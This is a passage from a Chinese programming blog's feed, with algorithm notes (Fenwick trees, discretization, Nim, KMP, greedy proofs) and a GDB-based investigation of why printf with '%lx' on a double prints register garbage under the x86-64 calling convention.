class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//NYOJ 123</span></span><br><span class="line"><span class="keyword">int</span> c[<span class="number">1000010</span>],N;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> <span class="comment">//求最低位1的位置所表示的数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x&amp;(-x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> p,<span class="keyword">int</span> q)</span><span class="comment">//常规数组中的a[p]更新，在树状数组中需要这样更新</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(p&lt;=N)</span><br><span class="line">    &#123;</span><br><span class="line">        c[p]+=q;</span><br><span class="line">        p+=lowbit(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">S</span><span class="params">(<span class="keyword">int</span> x)</span>  <span class="comment">//S(i)表示的是的前i个数的和</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sum+=c[x];</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"sum: "</span>&lt;&lt;sum&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        x-=lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;T,&amp;N);</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s);</span><br><span class="line">        <span class="keyword">if</span>(s[<span class="number">0</span>]==<span class="string">'A'</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> l,r,num;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            update(l,num);</span><br><span class="line">            update(r+<span class="number">1</span>,-num);</span><br><span class="line">          <span class="comment">//每个士兵 i 的军功都是前 i 个元素的和，所以，[l, m]区间每个人加 num 的军功只需要给</span></span><br><span class="line">          <span class="comment">//l 位置加上num，这样，[l, N]区间的每个人都加上了 num ，但是，我们只要[l, m]，所以要</span></span><br><span class="line">          <span class="comment">//给 m+1 位置减去num,</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> x;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,S(x));</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=x;i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;c[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=x;i++) &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;S(i)&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="离散化"><a href="#离散化" class="headerlink" title="离散化"></a>离散化</h3><ul><li><p><a href="https://vijos.org/p/1056" target="_blank" rel="noopener">图形面积</a>，<a href="http://www.cnblogs.com/forgot93/archive/2014/07/02/3819956.html" target="_blank" rel="noopener">解答</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">double</span> x[<span class="number">201</span>],y[<span class="number">201</span>],s[<span class="number">101</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> xy[<span class="number">201</span>][<span class="number">201</span>];</span><br><span class="line"><span class="keyword">int</span> n,cas=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">double</span> sum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)   <span class="keyword">break</span>;</span><br><span class="line">        cas++;</span><br><span class="line">        k=<span class="number">0</span>;</span><br><span class="line">        sum=<span class="number">0.0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(xy,<span class="number">0</span>,<span class="keyword">sizeof</span>(xy));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;s[i][<span class="number">0</span>]&gt;&gt;s[i][<span class="number">1</span>]&gt;&gt;s[i][<span class="number">2</span>]&gt;&gt;s[i][<span class="number">3</span>];</span><br><span class="line">            x[k]=s[i][<span class="number">0</span>];</span><br><span class="line">            y[k]=s[i][<span class="number">1</span>];</span><br><span class="line">            k++;</span><br><span class="line">            x[k]=s[i][<span class="number">2</span>];</span><br><span class="line">            y[k]=s[i][<span class="number">3</span>];</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(x,x+<span class="number">2</span>*n);</span><br><span class="line">        sort(y,y+<span class="number">2</span>*n);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="keyword">int</span>  i1=lower_bound(x,x+<span class="number">2</span>*n,s[i][<span class="number">0</span>])-x;<span class="comment">//二分查找，跟普通的FOR语句一样</span></span><br><span class="line">         <span class="keyword">int</span>  j1=lower_bound(y,y+<span class="number">2</span>*n,s[i][<span class="number">1</span>])-y;</span><br><span class="line">         <span class="keyword">int</span>  i2=lower_bound(x,x+<span class="number">2</span>*n,s[i][<span class="number">2</span>])-x;</span><br><span class="line">         <span class="keyword">int</span>  j2=lower_bound(y,y+<span class="number">2</span>*n,s[i][<span class="number">3</span>])-y;</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">int</span> p1=i1;p1&lt;i2;p1++)</span><br><span class="line">           <span class="comment">//标记状态，记住我们是以一个方块的角标记状态所以p1&lt;i2，不是&lt;=</span></span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">int</span> p=j1;p&lt;j2;p++)</span><br><span class="line">         xy[p1][p]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>*n;i++)<span class="comment">//统计</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>*n;j++)</span><br><span class="line">            <span class="keyword">if</span> (xy[i][j]) &#123;</span><br><span class="line">            sum+=(x[i+<span class="number">1</span>]-x[i])*(y[j+<span class="number">1</span>]-y[j]);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Test case #%d\n"</span>,cas);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Total explored area: %.2f\n"</span>,sum);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是，把坐标间的距离都忽略掉，把坐标的集中在一起，一个挨着一个，然后遍历整个标记区域，某个单元格有标记说明该位置两边都对应地存在两个坐标（原始数据中的），则只需要知道这两个原始数据中的坐标相差多远，就可以知道这个标记代表着多大的面积。</p></li></ul><h3 id="POJ3278"><a href="#POJ3278" class="headerlink" title="POJ3278"></a>POJ3278</h3><ul><li>N是人的位置，K是牛的位置</li><li>一种lgN的做法<ul><li>如果N的二进制大于等于K的二进制，则直接走x-1法</li><li>否则，想办法修改N的二进制使得其与K的二进制的最高几位重合，然后接下来的二进制就直接用x2和+1来实现（二进制位为0则x2，为1则+1）</li><li>假设K与N重合的二进制部分为W<ul><li>如果W&lt;N，可以消减N使得N==W，也可以N乘以多次2然后减去一些1使得N与新的W相同（因为随着N×2，其与K重合的最高二进制位变多，所以说是新的W）</li><li>如果W&gt;N，可以先进行多次加一使得重合，或者是多次×2后多次-1使得重合</li><li>即使W小于N，也有可能先乘以几次2后在进行几次-1比较高效（因为可能后面很多个1，导致如果直接消减W）</li></ul></li><li>总结起来就是，构造W与N相同的过程中，可以对N乘以一次2、两次2…P次2，对于每种乘2，减去或加上一些1使得重合，然后再计算在此基础上需要的时间</li><li>也就是不断试错的过程</li></ul></li></ul><h3 id="子集和问题的动态规划解法"><a href="#子集和问题的动态规划解法" class="headerlink" title="子集和问题的动态规划解法"></a>子集和问题的动态规划解法</h3><ul><li>如果只是要求出是否有一个解法，或者是要求出有多少个解法，那么动态规划可行</li></ul><h3 id="子集和问题变形"><a href="#子集和问题变形" class="headerlink" title="子集和问题变形"></a>子集和问题变形</h3><ul><li>问题：给定一个正整数M和另一个K，要求求出M切分成K份，每份都是正整数的解法有多少。同样可以动态规划</li></ul><h3 id="floyd求最小环"><a href="#floyd求最小环" class="headerlink" title="floyd求最小环"></a>floyd求最小环</h3><ul><li>最小环的定义：在有向或是无向的简单图中在找到一条路径，其从点x到点x，总的权重最小。（不可以直接x到x，在无向图中也不可以利用x到y，y到x，因为如果可以这样，意味着多重边或是使用同一条边）</li><li>如果可以确定w[x][x] = INF，那么floyd然后找到最小的w[x][x]既可。</li><li>否则，不可以通过使得所有的w[x][x]变为INF来实现，因为floyd过程中，会使用到</li></ul><h3 id="查询第K大"><a href="#查询第K大" class="headerlink" title="查询第K大"></a>查询第K大</h3><ul><li>如果是静态数组，多次查询，直接一个sort</li><li>如果是静态数组，一次查询，算导中那个快排变体，$O(N)$</li><li>如果是动态数组，字典树——每个数以二进制表示，构造字典树，字典树的node需要维护当前node为root的子树的叶子数目，从而在任意一个非叶子节点，可以选择要走那条路下去——可以算出，二进制比x进制更快</li></ul><h3 id="Nim游戏（博弈论）"><a href="#Nim游戏（博弈论）" class="headerlink" title="Nim游戏（博弈论）"></a>Nim游戏（博弈论）</h3><ul><li><blockquote><p>定义P-position和N-position，其中P代表Previous，N代表Next。直观的说，上一次move的人有必胜策略的局面是P-position，也就是“后手可保证必胜”或者“先手必败”，现在轮到move的人有必胜策略的局面是N-position，也就是“先手可保证必胜”。更严谨的定义是：1.无法进行任何移动的局面（也就是terminal position）是P-position；2.可以移动到P-position的局面是N-position；3.所有移动都导致N-position的局面是P-position。</p></blockquote></li><li>P-position需要保证所有子格局都是N-position，N-position只要找到第一个子格局是P-position即可。</li><li>通过数学归纳法，两堆石子的情况下，两堆相等是P-position</li><li><blockquote><p>如果局面不可能重现，或者说positions的集合可以进行拓扑排序，那么每个position或者是P-position或者是N-position，而且可以通过定义计算出来。</p></blockquote></li><li></li></ul><h3 id="HDU3483"><a href="#HDU3483" class="headerlink" title="HDU3483"></a>HDU3483</h3><h5 id="题意"><a href="#题意" class="headerlink" title="[题意]"></a>[题意]</h5><p>输入n, x, m ，求$(1^x)<em>(x^1)+(2^x)</em>(x^2)+(3^x)<em>(x^3)+…+(n^x)</em>(x^n)$ </p><h5 id="解题方法"><a href="#解题方法" class="headerlink" title="[解题方法]"></a>[解题方法]</h5><p>设$f[n] = [x^n, n<em>(x^n), (n^2)</em>(x^n),…, (n^x)<em>(x^n)]$，则$f[n][k] = (n^k)</em>(x^n)$，问题转化为求：$(g[n] = f[1][x]+f[2][x]+…+f[n][x])$，设C(i,j)为组合数，即i种元素取j种的方法数，所以有：$$f[n+1][k] = ((n+1)^k)<em>(x^(n+1)) \text{（二次多项式展开）}\ = x</em>( C(k,0)<em>(x^n)+C(k,1)</em>n<em>(x^n)+…+C(k,k)</em>(n^k)<em>(x^n))\= x</em>(C(k,0)<em>f[n][0]+C(k,1)</em>f[n][1]+…+C(k,k)*f[n][k])​$$<br>所以得： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|x*1 0................................0|        |f[n][0]|       |f[n+1][0]| </span><br><span class="line">|x*1 x*1 0............................0|        |f[n][1]|       |f[n+1][1]| </span><br><span class="line">|x*1 x*2 x*1 0........................0|    *   |f[n][2]|   =   |f[n+1][2]| </span><br><span class="line">|......................................|        |.......|       |.........| </span><br><span class="line">|x*1 x*C(k,1) x*C(k,2)...x*C(k,x) 0...0|        |f[n][k]|       |f[n+1][k]| </span><br><span class="line">|......................................|        |.......|       |.........| </span><br><span class="line">|x*1 x*C(x,1) x*C(x,2).......x*C(x,x) 0|        |f[n][x]|       |f[n+1][x]| </span><br><span class="line">|0................................0 1 1|        |g[n-1] |       | g[ n ]  |</span><br></pre></td></tr></table></figure><h3 id="KMP算法理解"><a href="#KMP算法理解" class="headerlink" title="KMP算法理解"></a>KMP算法理解</h3><h4 id="预处理算法"><a href="#预处理算法" class="headerlink" title="预处理算法"></a>预处理算法</h4><ul><li>预处理出来的第 $i$ 位结果 $p[i]$ 是原字符串截止到第 $i$ 那个字符的最小周期，也就是只需要移动最少量的字符 $p[i]$ 既可以使得原先匹配部分再次匹配起来。</li></ul><h3 id="为什么偶数长度的回文数字串不是primer"><a href="#为什么偶数长度的回文数字串不是primer" class="headerlink" title="为什么偶数长度的回文数字串不是primer"></a>为什么偶数长度的回文数字串不是primer</h3><ul><li><a href="https://leetcode.com/problems/prime-palindrome/discuss/212297/Why-even-prime-palindromes-are-not-possible" target="_blank" rel="noopener">ref</a></li><li><blockquote><p>Because even length prime digit numbers are divisible by 11 therefore are not prime.<br>It’s a trick that has to do powers of 10 and mod 11.<br>Ex: 10 = 10^1 mod 11 = -1 mod 11<br>​      $100 = 10^2 = 1 \mod 11$<br>​      $1000 = 10^3 = -1 \mod 11$<br>​      $10000 = 10^4 = 1 \mod 11$<br>See the pattern?<br>Even exponent powers of 10 are 1 mod 11<br>Odd exponent powers of 10 are -1 mod 11.</p><p>We also know decimal numbers are just base 10 expansion of the digits.</p><p>So   $1225 = (10^3<em>)1 + 2</em>(10^2) + 2<em>(10^1) + 5</em>(10^0).$<br>​        using modular arithmetic we can say,</p><pre><code>1225 MOD 11 = (-1)*1 + 2*(1) + 2*(-1) + 5*(1) = -1 + 2 + 2 + 5 = 8.In other words, in MOD 11 we calculate what a decimal number is by just alternating the addition and subtraction across the digits.</code></pre><p>Another example.</p><p>$1323412 \mod 11 =   1 -3  +2 -3 +4 -1 +2\mod 11 = 0.$</p><p>Then it becomes why it is quite obvious why the above logic works for even palindromes.</p><p>Example: </p><p>$321123 =      -3 + 2 - 1 + 1 -2 + 3 = 0$. All the numbers cancel out with each other.</p></blockquote></li></ul><h3 id="贪心算法总结"><a href="#贪心算法总结" class="headerlink" title="贪心算法总结"></a>贪心算法总结</h3><ul><li>在每个贪心算法后面几乎总有一个DP解法</li><li>如何<strong>证明</strong>是否可以用贪心算法求解一个问题？并没有通用方法，但是贪心选择性质和最优子结构是两个关键要素</li><li>如果贪心选择时需要考虑众多选择，通常意味着可以改进贪心选择来获得更高效的解法</li></ul><h5 id="贪心选择性质"><a href="#贪心选择性质" class="headerlink" title="贪心选择性质"></a>贪心选择性质</h5><ul><li>可以通过做出局部最优的选择来构造全局最优</li><li>证明方法：首先考察某个子问题的最优解，然后用贪心选择替换某个其他选择来修改此解，从而得到一个相似但是更小的子问题</li></ul><h5 id="一组有效的步骤"><a href="#一组有效的步骤" class="headerlink" title="一组有效的步骤"></a>一组有效的步骤</h5><ul><li>确定问题的最优子结构（如果一个问题的最优解包含其子问题的最优解，则称此问题具有最优子结构性质）</li><li>设计一个递归解法（该递归解法加上记忆就可以变成自顶向下的DP）</li><li>证明如果做出一个贪心选择，就只剩下一个子问题（或许可能是几个子问题？不过子问题的数量确实要比自顶向下的DP解法少）</li><li>证明贪心选择总是安全的<ul><li>什么是安全的？</li><li>做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的</li><li>做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构</li></ul></li><li>设计一个递归算法实现贪心策略</li><li>把递归算法转为迭代算法</li></ul><h5 id="一组简化的步骤"><a href="#一组简化的步骤" class="headerlink" title="一组简化的步骤"></a>一组简化的步骤</h5><ul><li>将最优化问题转为这样的形式：做出一次选择后，只剩下一个子问题需要求解</li><li>证明做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的</li><li>证明做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;全源最短路径的一种错误解法&quot;&gt;&lt;a href=&quot;#全源最短路径的一种错误解法&quot; class=&quot;headerlink&quot; title=&quot;全源最短路径的一种错误解法&quot;&gt;&lt;/a&gt;全源最短路径的一种错误解法&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;错误代码&lt;/p&gt;
&lt;figure 
      
    
    </summary>
    
      <category term="算法" scheme="https://h-zex.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="ACM" scheme="https://h-zex.github.io/tags/ACM/"/>
    
      <category term="note" scheme="https://h-zex.github.io/tags/note/"/>
    
  </entry>
  
  <entry>
    <title>printf的一个异常现象引发的对x86-64体系下可变参数传参的探究</title>
    <link href="https://h-zex.github.io/2018/01/19/printf%E7%9A%84%E4%B8%80%E4%B8%AA%E5%BC%82%E5%B8%B8%E7%8E%B0%E8%B1%A1%E5%BC%95%E5%8F%91%E7%9A%84%E5%AF%B9x86-64%E4%BD%93%E7%B3%BB%E4%B8%8B%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0%E4%BC%A0%E5%8F%82%E7%9A%84%E6%8E%A2%E7%A9%B6/"/>
    <id>https://h-zex.github.io/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/</id>
    <published>2018-01-19T03:31:36.000Z</published>
    <updated>2018-08-04T04:48:35.573Z</updated>
    
    <content type="html"><![CDATA[<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clang version 3.8.1-24 (tags/RELEASE_381/final)</span><br><span class="line">Target: x86_64-pc-linux-gnu</span><br><span class="line">Thread model: posix</span><br><span class="line"></span><br><span class="line">Linux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19)</span><br></pre></td></tr></table></figure><h3 id="奇异现象复现"><a href="#奇异现象复现" class="headerlink" title="奇异现象复现"></a>奇异现象复现</h3><ul><li><p>代码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">6.0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%lx\n"</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>执行结果</p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p6.png"></li><li><p>这段代码用的运行结果是随机的，无规律的，这是非常奇怪的</p></li></ul><h3 id="先说原因"><a href="#先说原因" class="headerlink" title="先说原因"></a>先说原因</h3><ul><li>printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li><p>先看glibc-2.26中<code>stdio-common/printf.c</code>的源码</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__printf (<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;</span><br><span class="line">  <span class="keyword">int</span> done;</span><br><span class="line"></span><br><span class="line">  va_start (arg, format);</span><br><span class="line">  done = <span class="built_in">vfprintf</span> (<span class="built_in">stdout</span>, format, arg);</span><br><span class="line">  va_end (arg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以看到，使用的是stdarg的机制实现可变参数传参。</p></li><li><p>如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参</p></li><li><p>复习一下CSAPP第三章</p> <img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p1.png"> <img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p2.png"></li><li><p>可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器</p></li><li>那么猜测，这应该是问题所在。printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li></ul><h3 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h3><ul><li><p>使用 <code>clang -S d.c &amp;&amp;  clang d.s -g</code>命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点</p></li><li><p>main函数部分汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">subq$16, %rsp</span><br><span class="line">movabsq$.L.str, %rdi# .L.str就是&quot;%lx\n&quot;</span><br><span class="line">movsd.LCPI0_0, %xmm0    </span><br><span class="line"># 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0</span><br><span class="line">movsd%xmm0, -8(%rbp)</span><br><span class="line">movsd-8(%rbp), %xmm0        </span><br><span class="line">movb$1, %al</span><br><span class="line">callqprintf</span><br></pre></td></tr></table></figure></li><li><p>可以看到，double a 确实放在了xmm0,</p></li><li><p>用GDB在 <code>callq printf</code> 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器</p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p4.png"><p>（红框内是前四个传参的通用目的寄存器）</p></li><li><p>执行gdb 的<code>next</code>指令 ，运行<code>callq printf</code>这条指令，检查输出</p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p3.png"></li><li><p>可以看到，与<code>rsi</code>寄存器的内容一样。可以初步确认，因为格式字符串是”%lx”，所以printf在通用目的寄存器读取可变参数</p></li><li><p>手动修改汇编代码，在callq printf之前加上一条<code>movq $16, %rsi</code>（注意，此处是十进制，而printf使用的格式字符串是”%lx”，所以程序输出的是十六进制）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">movabsq$.L.str, %rdi</span><br><span class="line">movsd.LCPI0_0, %xmm0         # xmm0 = mem[0],zero</span><br><span class="line">movsd%xmm0, -8(%rbp)</span><br><span class="line">movsd-8(%rbp), %xmm0         # xmm0 = mem[0],zero</span><br><span class="line">movb$1, %al</span><br><span class="line">movq    $16, %rsi # 这一条就是加上去的</span><br><span class="line">callqprintf</span><br></pre></td></tr></table></figure></li><li><p>运行，结果是</p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p5.png"></li><li><p>符合预期，与rsi寄存器的东西一样</p></li><li><p>分析结果得到证实</p></li></ul><h3 id="探究过程出现的一些问题"><a href="#探究过程出现的一些问题" class="headerlink" title="探究过程出现的一些问题"></a>探究过程出现的一些问题</h3><ul><li>在不合时宜的时刻检查寄存器的值<ul><li>执行完<code>callq printf</code>后才检查xmm0、xmm1的内容，企图找到double a</li><li>执行完<code>callq printf</code>后才检查rdi、rsi的值。</li></ul></li><li>因为printf函数会使用这些寄存器，所以这样检查必然是不行的</li></ul><h3 id="关于vc-的一些补充"><a href="#关于vc-的一些补充" class="headerlink" title="关于vc++的一些补充"></a>关于vc++的一些补充</h3><ul><li><p><a href="https://msdn.microsoft.com/zh-cn/library/zthk2dkh.aspx" target="_blank" rel="noopener">Visual Studio 2015的参数传递文档</a></p><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p8.png"><img src="/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p7.png"><p>​    <strong>注意：这里的b不是在xmm0，而是在xmm1，d也是如此</strong></p></li></ul><ul><li><p><a href="https://msdn.microsoft.com//library/dd2wa36c.aspx" target="_blank" rel="noopener">Visual Studio 2015 的 Varargs文档 </a></p><blockquote><p> 如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。<strong>仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值</strong></p><p> if parameters are passed via varargs (for example, ellipsis 